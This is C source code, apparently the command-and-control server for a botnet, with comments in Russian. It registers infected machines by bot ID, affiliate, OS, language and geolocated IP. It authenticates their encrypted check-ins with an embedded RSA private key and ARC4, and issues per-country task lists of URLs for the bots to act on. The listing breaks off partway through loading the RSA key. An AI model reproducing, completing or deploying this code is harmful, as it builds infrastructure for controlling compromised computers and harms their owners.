#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <mysql/mysql.h>
#include <mysql/mysqld_error.h>

#include "../../shared_code/platform.h"
#include "../../shared_code/types.h"
#include "../../shared_code/config.h"

#include "../../shared_code/base64.h"
#include "../../shared_code/timing.h"
#include "../../shared_code/crc64.h"
#include "../../shared_code/salsa20.h"

#include "../../shared_code/bignum.h"
#include "../../shared_code/bn_mul.h"
#include "../../shared_code/rsa.h"
#include "../../shared_code/arc4.h"

#include "../../shared_code/hiredis/hiredis.h"

#define SYS_ALLOCATOR(sz) malloc(sz)
#define SYS_DEALLOCATOR(ptr) free(ptr)
#define MEMCPY memcpy
#define MEMSET memset
#include "../../shared_code/bignum.c"

#define USE_RSA_PRIVATE_DECRYPT_HASH
#include "../../shared_code/rsa.c"
#include "../../shared_code/arc4.c"

#define MAJOR_HANDLER_VERSION 0
#define MINOR_HANDLER_VERSION 57

#define RSA_SIGN_SIZE 128
#define BOTID_SIZE 32
#define POST_BODY_MIN_SIZE 68 + 16

#define NRT_SYSTEM_INFO "t01"
#define NRT_TASKS_REQUEST_AND_REPORT "t02"
#define NRT_TASKS_CONFIRM "t03"
#define NRT_TASK_REPORT "t04"


#define MYSQL_DB 1
#define Z0wX_DB_TYPE MYSQL_DB

#include "platform.h"
#include "errors.h"
#include "globalconfig.h"
#include "logger.h"
//#include "mem.h"
#include "geoip.h"
#include "fcgiw.h"
#include "db.h"
#include "mempool.h"
#include "configuration.h"

static memory_pool_t gPostBodyPool;
static memory_pool_t gConfigurationPool;
static memory_pool_t gFcgiReqPool;
static memory_pool_t gBotDataPool;
static memory_pool_t gShaHashPool;
static memory_pool_t gQueryPool;
static memory_pool_t gTasksPool;
static uint8_t gPrivRSAKey[9 * 128] = {'R', 'S', 'A', ' ', 'P', 'R', 'I', 'V', 'A', 'T', 'E', ' ', 'K', 'E', 'Y', '!'};

const configuration_t gConfiguration = {{'<', 'c', 'o', 'n', 'f', 'i', 'g', '>'}};

global_config_t gGlobalConfig;
rsa_context_t gRsaContext;

void* handleConfigParameter(char* keyName, int* pValueType)
{
	void* pVal = NULL;

	if (gGlobalConfig.socketPath == 0 && strcmp(keyName, "sockfile") == 0) {
		pVal = (void*)&gGlobalConfig.socketPath; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.syslogIdent == 0 && strcmp(keyName, "syslog_ident") == 0) {
		pVal = (void*)&gGlobalConfig.syslogIdent; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "log_warnings") == 0) {
		pVal = (void*)&gGlobalConfig.logWarnings; *pValueType = TYPE_UINT16;
	}
	else if (strcmp(keyName, "log_infos") == 0) {
		pVal = (void*)&gGlobalConfig.logInfos; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.dbHost == 0 && strcmp(keyName, "db_host") == 0) {
		pVal = (void*)&gGlobalConfig.dbHost; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "db_port") == 0) {
		pVal = (void*)&gGlobalConfig.dbPort; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.dbUser == 0 && strcmp(keyName, "db_user") == 0) {
		pVal = (void*)&gGlobalConfig.dbUser; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.dbPassword == 0 && strcmp(keyName, "db_pwd") == 0) {
		pVal = (void*)&gGlobalConfig.dbPassword; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.dbName == 0 && strcmp(keyName, "db_name") == 0) {
		pVal = (void*)&gGlobalConfig.dbName; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "request_pool_size") == 0) {
		pVal = (void*)&gGlobalConfig.requestPoolSize; *pValueType = TYPE_SIZET;
	}
	else if (strcmp(keyName, "http_post_body_size") == 0) {
		pVal = (void*)&gGlobalConfig.httpPostBodySize; *pValueType = TYPE_SIZET;
	}
	else if(gGlobalConfig.geoipDataFile == 0 && strcmp(keyName, "geoip_data_file") == 0) {
		pVal = (void*)&gGlobalConfig.geoipDataFile; *pValueType = TYPE_STRING;
	}
	
	return pVal;
}

// Алгоритм обновления статистики клиента
// 1. Получаем запись из clients_stat для указанного id-клиента. Если результат нулевой, то получаем Geo информацию об IP и добавляем запись.
// 2. Иначе, проверяем соответствие текущего ip с тем, что в базе, если они совпадают, то обновляем только поле tm
// 3. Иначе, обновляем поля ip, country_code, city, tm.
int logic_update_bot_statistics(MYSQL* conn, const char* const id, uint32_t ip, uint32_t dbIp, char* query)
{
	int err = ERR_MYSQL;
	char* countryCode;
	char* sIp;
	struct in_addr inAddr;
	USE_PERF;

	if (dbIp == 0) {
		inAddr.s_addr = ip;
		sIp = inet_ntoa(inAddr);
		snprintf(query, 1024, "INSERT INTO clients_stat (id, ip, country_code, tm) VALUES('%.32s', '%u', '%.64s',  now())", id, ip, geoip_get_country(sIp));
	}
	else if (ip != dbIp) {
		inAddr.s_addr = ip;
		sIp = inet_ntoa(inAddr);
		countryCode = (char*)geoip_get_country(sIp);
		snprintf(query, 1024, "UPDATE clients_stat SET ip='%u', country_code='%.64s', tm=now() WHERE id='%.32s'", ip, countryCode ? countryCode : "unknown", id);
	}
	else {
		snprintf(query, 1024, "UPDATE clients_stat SET tm=now() WHERE id='%.32s'", id);
	}

	logger_info(query);

	BEGIN_PERF;
	if (db_query(conn, query) == 0) {
		err = ERR_OK;
	}
	END_PERF(query);
		
	return err;
}

int logic_update_bot_info(const char* const id, uint32_t ip, uint8_t* data, uint16_t dataLen)
{
#define REAL_DATA_SIZE 13
	int err = ERR_MYSQL;
	MYSQL_RES* mysqlResult1 = NULL;
	MYSQL_ROW mysqlRow;
	MYSQL* mysql;
	
	uint8_t botVer;
	uint16_t botId;
	uint16_t botSubId;
	uint32_t botAffId;
	uint16_t botOsVer;
	uint16_t botOsLang;
	uint8_t botDbVer;
	uint16_t botDbOsVer;
	uint16_t botDbOsLang;
	uint32_t botIp = 0;
	char* query;
	int mysqlErr;	
	int numRows;
	char* sBotVer;
	char* sBotOsVer;
	char* sBotOsLang;
	char* sBotIp;

//	redisContext* redisCtx = NULL;
//	redisReply* redisReply = NULL;
	USE_PERF;
//	struct timeval timeout = {3, 0}; // 3 seconds

	if (dataLen != REAL_DATA_SIZE)
		return ERR_INVALID_DATA;

//	redisCtx = redisConnectWithTimeout((char*)"127.0.0.1", 6379, timeout);
//	if (redisCtx->err) {
//		return ERR_REDIS_CONNECT;
//	}

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	mysql = db_get_mysql();

	if (mysql == NULL) {
		mempool_release(&gQueryPool, query);
		return ERR_MYSQL;
	}

	botVer = *data;
	botId = *(uint16_t*)(data + 1);
	botSubId = *(uint16_t*)(data + 3);
	botAffId = *(uint32_t*)(data + 5);
	botOsVer = *(uint16_t*)(data + 9);
	botOsLang = *(uint16_t*)(data + 11);

//	redisReply = redisCommand(redisCtx, "EXISTS id:%.32s", id);
//	printf("SET: %s : %lld\n", redisReply->str, redisReply->integer);

	// Пробуем достать из клиентов бота с указанным id.
	snprintf(query, 1024, "SELECT c.client_ver,c.os_ver,c.lang,st.ip FROM clients c LEFT JOIN clients_stat st ON c.id=st.id WHERE c.id='%.32s'", id);
	logger_info(query);
	
	BEGIN_PERF;
	mysqlErr = db_query(mysql, query);
	END_PERF(query);
	if (mysqlErr == 0) {
		do {
			mysqlResult1 = mysql_store_result(mysql);
			if (mysqlResult1 == NULL) { // Ошибка или нет такой записи в clients.
				if (mysql_field_count(mysql) != 0)
					break;
				// Пытаемся создать запись в clients.
				snprintf(query, 1024, "INSERT INTO clients(id,client_ver,client_id,client_subid,user_id,os_ver,lang,created) VALUES('%.32s',%d,%d,%d,%u,%d,%d,now())",
					id, botVer, botId, botSubId, botAffId, botOsVer, botOsLang);
				logger_info(query);
				mysqlErr = db_query(mysql, query);
			}
			else {
				numRows = mysql_num_rows(mysqlResult1);
				if (numRows <= 0) {
					// Пытаемся создать запись в clients.
					snprintf(query, 1024, "INSERT INTO clients(id,client_ver,client_id,client_subid,user_id,os_ver,lang,created) VALUES('%.32s',%d,%d,%d,%u,%d,%d,now())",
						id, botVer, botId, botSubId, botAffId, botOsVer, botOsLang);
					logger_info(query);
					BEGIN_PERF;
					mysqlErr = db_query(mysql, query);
					END_PERF(query);
				}
				else {
					mysqlRow = mysql_fetch_row(mysqlResult1);
					sBotVer = mysqlRow[0];
					sBotOsVer = mysqlRow[1];
					sBotOsLang = mysqlRow[2];
					sBotIp = mysqlRow[3];

					botDbVer = (uint8_t)atoi(sBotVer);
					botDbOsVer = (uint16_t)atoi(sBotOsVer);
					botDbOsLang = (uint16_t)atoi(sBotOsLang);
					if (sBotIp != NULL)
						botIp = (uint32_t)atoll(sBotIp);

					if (botVer == botDbVer && botOsVer == botDbOsVer && botOsLang == botDbOsLang) {
						err = ERR_OK;
						break;
					}

					snprintf(query, 1024, "UPDATE clients SET client_ver=%d,os_ver=%d,lang=%d WHERE id='%.32s'",
						botVer, botOsVer, botOsLang, id);
					logger_info(query);
	
					mysqlErr = db_query(mysql, query);
				}
			}
		} while (0);
	}

	if (mysqlResult1 != NULL)
		mysql_free_result(mysqlResult1);

	if (err == ERR_OK) {
		// Не учитываем ошибку возвращённую данной функцией, в силу того, что основная задача данной функции выполнена.
		/*err = */logic_update_bot_statistics(mysql, id, ip, botIp, query);
	}

	
	db_release_mysql(mysql);
	mempool_release(&gQueryPool, query);

//	if (redisReply != NULL) {
//		freeReplyObject(redisReply);
//	}
	
	return err;
}

int logic_confirm_tasks_for_bot(const char* const id, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	int err = ERR_MEMPOOL;
	MYSQL* mysql;
	uint8_t* taskList;
	char* query;
	uint32_t cnt = 0;
	uint16_t i;
	int mysqlErr;
	USE_PERF;

	if (dataLen > 0 && dataLen % 5 != 0)
		return ERR_INVALID_DATA;

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	mysql = db_get_mysql();

	if (mysql == NULL) {
		mempool_release(&gQueryPool, query);
		return ERR_MEMPOOL;
	}

	do {
		taskList = mempool_get(&gTasksPool);
		if (taskList == NULL) {
			break;
		}

		memset(taskList + 1024, 0, gTasksPool.blockSize - 1024);

		for (i = 0; i < dataLen; i += 5) {
			snprintf(query, 1024, "UPDATE tasks_assignment SET end = now(), status = '1' where client_id = '%.32s' and task_id = '%u'", id, *(uint32_t*)&data[i]);
			logger_info(query);

			BEGIN_PERF;
			mysqlErr = db_query(mysql, query);
			END_PERF(query);
			if (mysqlErr == 0) {
				memcpy(taskList + cnt, data + i, 5);
				cnt += 5;
			}
		}

		base64_encode(taskList, cnt, taskList + 1024);
		*pTaskList = taskList;
				
		err = ERR_OK;
	} while (0);
	
	db_release_mysql(mysql);
	mempool_release(&gQueryPool, query);

	return err;
}

int logic_check_tasks_for_bot(const char* const id, uint32_t ip, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	MYSQL* mysql;
	int err = ERR_MYSQL;
	int mysqlErr;
	char* query;
	MYSQL_RES* mysqlResult1 = NULL;
	MYSQL_RES* mysqlResult2 = NULL;
	MYSQL_ROW mysqlRow;
	int numRows;
	uint8_t status;
	uint8_t* taskList = NULL;
	uint8_t* taskListPtr = NULL;
	uint16_t i;
	uint32_t cnt = 0;
	char* client_ver;
	char* client_subid;
	char* aff_id;
	char* os_ver;
	char* lang;
	char* dbIp;
	char* dbCountryCode;
	uint32_t botIp = 0;
	USE_PERF;

	if (dataLen > 0 && dataLen % 5 != 0)
		return ERR_INVALID_DATA;

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	mysql = db_get_mysql();

	if (mysql == NULL) {
		mempool_release(&gQueryPool, query);
		return ERR_MEMPOOL;
	}

	do {
		// Проверяем отчёты о выполненных заданиях.
		if (dataLen > 0) {
			taskList = mempool_get(&gTasksPool);
			if (taskList == NULL) {
				err = ERR_MEMPOOL;
				break;
			}

			memcpy(taskList, "..", 2);
			cnt = 3;

			for (i = 0; i < dataLen; i += 5) {
				status = data[i + 4];
				snprintf(query, 1024, "UPDATE tasks_assignment SET end=now(),status='%d',err_cnt=err_cnt+'%d' where client_id='%.32s' and task_id='%u'", status, status == 2 ? 0 : 1, id, *(uint32_t*)&data[i]);
				logger_info(query);
				
				BEGIN_PERF;
				mysqlErr = db_query(mysql, query);
				END_PERF(query);
				if (mysqlErr == 0) {
					memcpy(taskList + cnt, data + i, 5);
					cnt += 5;
				}
			}

			if (cnt <= 3) {
				cnt = 0;
			}
			else {
				taskList[2] = (uint8_t)((cnt - 3) / 5);
			}
		}

		// Получаем из базы данные о текущем боте.
		snprintf(query, 1024, "SELECT c.client_ver, c.client_subid, c.user_id, c.os_ver, c.lang, st.ip, st.country_code FROM clients c LEFT JOIN clients_stat st ON c.id = st.id WHERE c.id='%.32s'", id);
		logger_info(query);

		BEGIN_PERF;
		mysqlErr = db_query(mysql, query);
		END_PERF(query);
		if (mysqlErr == 0) {
			mysqlResult1 = mysql_store_result(mysql);
			if (mysqlResult1 == NULL) {
				break;
			}

			numRows = mysql_num_rows(mysqlResult1);

			if (numRows <= 0) {
				err = ERR_BOT_NOT_EXISTS;
				break;
			}

			mysqlRow = mysql_fetch_row(mysqlResult1);
			client_ver = mysqlRow[0];
			client_subid = mysqlRow[1];
			aff_id = mysqlRow[2];
			os_ver = mysqlRow[3];
			lang = mysqlRow[4];
			dbIp = mysqlRow[5];
			dbCountryCode = mysqlRow[6];
	
			if (dbIp != NULL)
				botIp = (uint32_t)atoll(dbIp);

			// Получаем задания.
			snprintf(query, 1024,
				"SELECT t.id, t.url FROM tasks t WHERE "
				"(t.client_ver IS NULL OR t.client_ver = '%.16s') AND "
				"(t.client_subid IS NULL OR t.client_subid = '%.16s') AND "
				"(t.AffId IS NULL OR t.AffId = '%.16s') AND "
				"(t.os_ver IS NULL OR t.os_ver = '%.5s') AND "
				"(t.lang IS NULL OR t.lang = '%.16s') AND "
				"(t.id NOT IN (SELECT task_id FROM tasks_assignment WHERE client_id = '%.32s')) AND "
				"(t.country_code IS NULL OR t.country_code = '%.64s') AND "
				"t.start <= now() AND (t.end IS NULL OR t.end >= now()) AND "
				"t.active = '1' LIMIT 3",
				client_ver, client_subid, aff_id, os_ver, lang, id, (dbCountryCode != NULL) ? dbCountryCode : "Unknown");
			logger_info(query);
			
			BEGIN_PERF;	
			mysqlErr = db_query(mysql, query);
			END_PERF(query);
			if (mysqlErr != 0) {
				break;
			}

			mysqlResult2 = mysql_store_result(mysql);
			if (mysqlResult2 == NULL) {
				break;
			}

			numRows = mysql_num_rows(mysqlResult2);

			if (numRows <= 0) {
				logger_info("No tasks for %.32s", id);
				err = ERR_OK;
				break;
			}

			logger_info("%d task(s) for %.32s", numRows, id);

			if (taskList == NULL) {
				taskList = mempool_get(&gTasksPool);
				if (taskList == NULL) {
					err = ERR_MEMPOOL;
					break;
				}
			}

			taskListPtr = taskList + cnt;
			
			memset(taskListPtr, 0, gTasksPool.blockSize - cnt);
			
			// Задания упаковываются в следующий список: id1|url1||id2|url2||...
			while ((mysqlRow = mysql_fetch_row(mysqlResult2))) {
				snprintf(query, 1024, "INSERT INTO tasks_assignment (client_id, task_id, status, start) VALUES ('%.32s', %.8s, 0, now()) ON DUPLICATE KEY UPDATE start = now()", id, mysqlRow[0]);
				logger_info(query);

				BEGIN_PERF;
				mysqlErr = db_query(mysql, query);
				END_PERF(query);
				if (mysqlErr == 0) {
					strncat((char*)taskListPtr, mysqlRow[0], 8);
					strncat((char*)taskListPtr, "|", 1);
					strncat((char*)taskListPtr, mysqlRow[1], 255);
					strncat((char*)taskListPtr, "||", 2);
				}
			}

			base64_encode(taskList, strlen((char*)taskListPtr) + cnt, taskList + 1024);
			*pTaskList = taskList;
			
			err = ERR_OK;
		}
	} while (0);

	if (err == ERR_OK) {
		// Не учитываем ошибку возвращённую данной функцией, в силу того, что основная задача данной функции выполнена.
		/*err = */logic_update_bot_statistics(mysql, id, ip, botIp, query);

		// Случай, когда бот вернул статусы заданий и не получил новых, в этом случае мы возвращаем боту статусы ошибок, которые он подтвердил.
		if (taskList != NULL && taskListPtr == NULL) {
			memset(taskList + 1024, 0, gTasksPool.blockSize - 1024);
			base64_encode(taskList, cnt, taskList + 1024);
			*pTaskList = taskList;
		}
	}
	else {
		if (taskList != NULL)
			mempool_release(&gTasksPool, taskList);
	}

	if (mysqlResult1 != NULL)
		mysql_free_result(mysqlResult1);

	if (mysqlResult2 != NULL)
		mysql_free_result(mysqlResult2);
		
	db_release_mysql(mysql);
	mempool_release(&gQueryPool, query);
	return err;
}

int logic_parse_and_decode_request(const char* botData, int dataLen, uint8_t** pDecodedData, uint16_t* pDecodedLen, pconfiguration_t* ppConfiguration)
{
	int err = ERR_MEMPOOL;
	uint8_t* shaHash = NULL;
	int hashSize = 0;
	pconfiguration_t pConfiguration = NULL;
	uint8_t* decodedData = NULL;
	arc4_context_t arc4;
	uint8_t crc[8];
	USE_PERF;
	
	BEGIN_PERF;

	do {
		decodedData = mempool_get(&gBotDataPool);
		if (decodedData == NULL) {
			break;
		}

		dataLen = base64_decode((uint8_t*)botData, dataLen, decodedData);
		
		shaHash = mempool_get(&gShaHashPool);
		if (shaHash == NULL) {
			break;
		}

		// Дешифруем SHA-1 дайджест.
		err = rsa_private_decrypt_hash(&gRsaContext, decodedData, shaHash, &hashSize);
		if (err != ERR_OK || hashSize != 20) {
			logger_error("Invalid hash value in decrypted RSA buffer");
			break;
		}

		pConfiguration = mempool_get(&gConfigurationPool);
		if (pConfiguration == NULL) {
			err = ERR_MEMPOOL;
			break;
		}

		memset(&arc4, 0, sizeof(arc4_context_t));
		arc4_setup(&arc4, shaHash, 20);
		arc4_crypt(&arc4, sizeof(gConfiguration), (const uint8_t*)&gConfiguration, (uint8_t*)pConfiguration);
		
		crc64_computate((uint8_t*)pConfiguration, sizeof(configuration_t) - sizeof(gConfiguration.block_hash), (uint32_t*)crc);

		if (memcmp(pConfiguration->block_hash, crc, 8) != 0) {
			err = ERR_BAD_CRC;
			logger_error("Incorrect crc in decrypted block");
			break;
		}

		// Возвращаем параметра если они есть.
		if (dataLen > RSA_SIGN_SIZE) {
			*pDecodedData = decodedData + RSA_SIGN_SIZE;
			*pDecodedLen = dataLen - RSA_SIGN_SIZE;
		}
		else {
			mempool_release(&gBotDataPool, decodedData);
		}

		*ppConfiguration = pConfiguration;

		err = ERR_OK;
	} while (0);

	if (err != ERR_OK) {
		if (decodedData != NULL)
			mempool_release(&gBotDataPool, decodedData);
		if (pConfiguration != NULL)
			mempool_release(&gConfigurationPool, pConfiguration);
	}

	if (shaHash != NULL) {
		mempool_release(&gShaHashPool, shaHash);
	}

	END_PERF("Bot verification");

	return err;
}

void* handler_knock_thread(void* arg)
{
	sigset_t sset;
	uint8_t* decodedData = NULL;
	pconfiguration_t pConfiguration = NULL;
	int err = ERR_MEMPOOL;
	uint16_t decodedLen = 0;
	uint8_t* taskList = NULL;
	char* botId;
	int dataLen, realLen;
	char* httpHost;
	char* httpPostBody = NULL;
	char *requestId, *tmp;
	char* botData;
	uint32_t clientIp;
	int dataSize;
	FCGX_Request* pRequest = (FCGX_Request*)arg;
	USE_PERF;

	sigemptyset(&sset);
	sigaddset(&sset, SIGQUIT);
	sigaddset(&sset, SIGTERM);
	sigaddset(&sset, SIGPIPE); 
	pthread_sigmask(SIG_BLOCK, &sset, 0);

	BEGIN_PERF;
	dataLen = atoi(FCGX_GetParam("CONTENT_LENGTH", pRequest->envp));
	botId = FCGX_GetParam("PATH_INFO", pRequest->envp);
	httpHost = FCGX_GetParam("HTTP_HOST", pRequest->envp);
	clientIp = (in_addr_t)inet_addr(FCGX_GetParam("REMOTE_ADDR", pRequest->envp));

	if (dataLen < POST_BODY_MIN_SIZE || botId == NULL || strlen(botId + 1) != 32) {
		logger_warn("Illegal query");
		goto end1;
	}

	++botId;

	logger_info("Bot %s connected from %u", botId, clientIp);

	httpPostBody = mempool_get(&gPostBodyPool);
	if (httpPostBody == NULL) {
		goto end1;
	}

	realLen = FCGX_GetStr(httpPostBody, dataLen, pRequest->in);

	if (realLen != dataLen || strncmp(httpPostBody, "--x7x7x7", 8) != 0 || (requestId = strstr(httpPostBody, "name=\"")) == NULL) {
		logger_warn("Illegal POST body");
		goto end1;
	}

	requestId += 6;

	tmp = strstr(requestId, "\r\n\r\n");

	if (tmp == NULL) {
		logger_warn("Illegal POST body");
		goto end1;	
	}

	tmp += 4;

	botData = tmp; // Данные переданные ботом

	for (dataLen = 0; *tmp != '\r'; ++dataLen, ++tmp);
	*tmp = 0;

	END_PERF("Data preparation");

	do {
		if (strncmp(requestId, NRT_SYSTEM_INFO, 3) == 0) {
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				break;
			}

			// Записываем данные в базу
			if (logic_update_bot_info(botId, clientIp, decodedData, decodedLen) != ERR_OK) {
				logger_error("Cannot update loader data for id: %.32s", botId);
				break;
			}
			
			logger_info("SYSTEM INFO qeury successfully handled for bot id: %.32s", botId);

			// Отправляем клиенту ответ 
			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", BOTID_SIZE);
			FCGX_FPrintF(pRequest->out, botId);
		}
		else if (strncmp(requestId, NRT_TASKS_REQUEST_AND_REPORT, 3) == 0) {			
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				break;
			}

			if (logic_check_tasks_for_bot(botId, clientIp, decodedData, decodedLen, &taskList) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.32s", botId);
				break;
			}

			logger_info("TASKS REQUEST AND REPORT qeury successfully handled for bot id: %.32s", botId);
			
			dataSize = BOTID_SIZE;

			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (taskList != NULL) {
				dataSize += strlen((char*)(taskList + 1024));
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (taskList != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(taskList + 1024));
				mempool_release(&gTasksPool, taskList);
			}
		}
		else if (strncmp(requestId, NRT_TASKS_CONFIRM, 3) == 0) {		
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				break;
			}

			if (logic_confirm_tasks_for_bot(botId, decodedData, decodedLen, &taskList) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.32s", botId);
				break;
			}

			logger_info("TASKS CONFIRM qeury successfully handled for bot id: %.32s", botId);

			dataSize = BOTID_SIZE;

			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (taskList != NULL) {
				dataSize += strlen((char*)(taskList + 1024));
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (taskList != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(taskList + 1024));
				mempool_release(&gTasksPool, taskList);
			}
		}
		err = ERR_OK;
	} while (0);
	
	if (decodedData != NULL)
		mempool_release(&gBotDataPool, decodedData - RSA_SIGN_SIZE);
	if (pConfiguration != NULL)
		mempool_release(&gConfigurationPool, pConfiguration);

end1:
	if (err != ERR_OK)
		FCGX_FPrintF(pRequest->out, "\r\n");
	FCGX_Finish_r(pRequest);
	mempool_release(&gFcgiReqPool, pRequest);
	if (httpPostBody != NULL)
		mempool_release(&gPostBodyPool, httpPostBody);

	return NULL;
}

void print_usage()
{
	printf("\nVersion %d.%d\nUsage: ./handler <config_path> <pid_path> <lock_path>\n", MAJOR_HANDLER_VERSION, MINOR_HANDLER_VERSION);
	printf("\tconfig_path - absolute path to configuration file\n");
	printf("\tpid_path - absolute path to pid file\n");
	printf("\tlock_path - absolute path to lock file\n");
}

#define CONF_PATH argv[1]
#define PID_PATH argv[2]
#define LOCK_PATH argv[3]

int main(int argc, char** argv, char** envs)
{
	FILE* gFin;
	FILE* gFout;
	FILE* gFerr;
	FILE* pidFile;
	int lockFile;
	pid_t pid;
//	sigset_t sset;
//	int sig;
	struct stat st;
	char data[32];
	int isDaemon = 1;
	uint8_t *ptr, sz;
	int sock;
	int rc;
	FCGX_Request* pRequest;
	pthread_t pThread;
	pthread_attr_t attributes;

	if (argc < 4) {
		fprintf(stderr, "Incorrect parameter list\n");
		print_usage();
		exit(1);
	}

	if (stat(argv[1], &st) != 0) {
		fprintf(stderr, "Path not exists: %s\n", argv[1]);
	}	

	if (argc == 4) {
		if ((pid = fork()) < 0) {
			logger_error("Cannot fork process");
			exit(1);
		}
		else if (pid != 0)
			exit(0);

		setsid();
		umask(0);

		gFin  = freopen("/dev/null", "r+", stdin);
		if (!gFin) {
			logger_error("Cannot attach stdin to /dev/null");
			return 1;
		}
		gFout = freopen("/dev/null", "r+", stdout);
		if (!gFout) {
			logger_error("Cannot attach stdout to /dev/null");
			return 1;
		}
		gFerr = freopen("/dev/null", "r+", stderr);
		if (!gFerr) {
			logger_error("Cannot attach stderr to /dev/null");
			return 1;
		}
//		if (chdir("/") != 0) {
//			logger_error("Cannot change path to /");
//			exit(1);
//		}
	}
	else if (strcmp(argv[4], "1") == 0) {
		isDaemon = 0;
	}

	if (logger_init(isDaemon))
		exit(1);

	if (isDaemon) {
		logger_info("handler became daemon");
	}

	memset(&gGlobalConfig, 0, sizeof(global_config_t));

	if (config_load(CONF_PATH, line_parser_conf, line_parser_conf_done, handleConfigParameter) != 0) {
		logger_error("Cannot read config %s", CONF_PATH);
		exit(1);
	}

//	size_t dbPoolSize;		// Размер пула соединений с базой
//	size_t requestPoolSize;	// Размер пула памяти запросов

	logger_info("PID file: %s", PID_PATH);
	logger_info("LOCK file: %s", LOCK_PATH);
	logger_info("SOCKET file: %s", gGlobalConfig.socketPath);
	logger_info("SYSLOG identifier: %s", gGlobalConfig.syslogIdent);
	logger_info("Log warnings: %d", gGlobalConfig.logWarnings);
	logger_info("Log infos: %d", gGlobalConfig.logInfos);
	logger_info("DB host: %s", gGlobalConfig.dbHost);
	logger_info("DB port: %d", gGlobalConfig.dbPort);
	logger_info("DB scheme name: %s", gGlobalConfig.dbName);
	logger_info("DB user login: %s", gGlobalConfig.dbUser);
	logger_info("DB user pwd: %s", gGlobalConfig.dbPassword);
	logger_info("GeoIp data file: %s", gGlobalConfig.geoipDataFile);

	lockFile = open(LOCK_PATH, O_RDWR | O_CREAT, 0640);
	if (lockFile < 0) {
		logger_error("Cannot open/create LOCK file: %s", LOCK_PATH);
		exit(1); // cannot open
	}
	if (lockf(lockFile, F_TLOCK, 0) < 0) {
		logger_error("Another instance of handler is running");
		exit(0); // can not lock
	}
	sprintf(data, "%d", getpid());
	write(lockFile, data, strlen(data)); /* record pid to lockfile */

	pidFile = fopen(PID_PATH, "wb");
	if (pidFile == NULL) {
		logger_error("Cannot create PID file: %s", PID_PATH);
		exit(1);
	}
	fprintf(pidFile, "%d", getpid());
	fclose(pidFile);

	if (FCGX_Init())
       	exit(1);

	if (db_init(gGlobalConfig.requestPoolSize))
		exit(1);

	if (geoip_init()) {
		logger_error("Cannot initialize GeoIp");
		exit(1);
	}

	if (mempool_init(&gConfigurationPool, sizeof(configuration_t), gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gConfigurationPool.name = "CONFIGURATION_BLOCK";

	if (mempool_init(&gPostBodyPool, gGlobalConfig.httpPostBodySize, gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gPostBodyPool.name = "POST_BODY";
		
	if (mempool_init(&gFcgiReqPool, sizeof(FCGX_Request), gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gFcgiReqPool.name = "FCGI_REQUEST";

	if (mempool_init(&gShaHashPool, 20, gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gShaHashPool.name = "SHA_HASH";

	if (mempool_init(&gBotDataPool, 512, gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gBotDataPool.name = "BOT_DATA";

	if (mempool_init(&gQueryPool, 1024, gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gQueryPool.name = "QUERY";

	if (mempool_init(&gTasksPool, 4096, gGlobalConfig.requestPoolSize, gGlobalConfig.requestPoolSize))
		exit(1);

	gQueryPool.name = "TASKS";

	// Инициализируем rsa контекст

	rsa_init(&gRsaContext, RSA_PKCS_V15, 0);

	ptr = gPrivRSAKey;
		
	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.N, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.E, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.D, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.P, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.Q, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.DP, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.DQ, ptr, sz))
		exit(1);
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.QP, ptr, sz))
